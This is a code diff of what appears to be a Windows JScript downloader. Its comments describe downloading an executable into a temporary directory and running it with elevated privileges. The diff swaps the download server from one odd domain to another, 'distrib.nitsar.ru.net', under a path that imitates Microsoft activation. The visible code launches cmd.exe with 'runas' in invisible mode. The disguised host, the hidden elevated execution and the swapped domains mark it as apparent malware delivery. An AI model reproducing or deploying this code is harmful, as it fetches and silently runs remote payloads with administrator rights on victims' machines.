@@ -48,7 +48,7 @@ Temporary Directory and Runs it with Elevated Privileges-->
 	'
 	' This Script Downloads a file from strURL Path
 	'
-	' PARAMETERS:	strURL — URL Path to Download
+	' PARAMETERS:	strURL ï¿½ URL Path to Download
 	' 				strFileNameExe - Name of a File
 	' RETURNS:		0 if Success Download and Run
 	'				1 if Error Occur
@@ -330,6 +330,7 @@ function getTempEnviron() {
 		if(!fso.FileExists(strPath + "\\" + strCmd)) return 1;
 		if(!fso.FileExists(pathCMD + "\\cmd.exe")) return 1;
 		// Run exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
+		
 		shApp.ShellExecute(pathCMD + "\\cmd.exe", strValue, strPath, "runas", 0);
 		// Run exe with Normal Privileges ("") at Normal Mode (1), with working Diretory strPath
 		// shApp.ShellExecute( pathCMD + "\\cmd.exe", strValue, strPath, "", 1 );
@@ -380,7 +381,7 @@ function getTempEnviron() {
 	//
 	var http_Pref, http_Host, http_Port, http_Path
 	http_Pref = "http";
-	http_Host = "clients.cxzbrk.xyz";
+	http_Host = "distrib.nitsar.ru.net";
 	http_Port = "80";
 	http_Path = "/Microsoft/Activation/";
 	// Define Temporary Variables
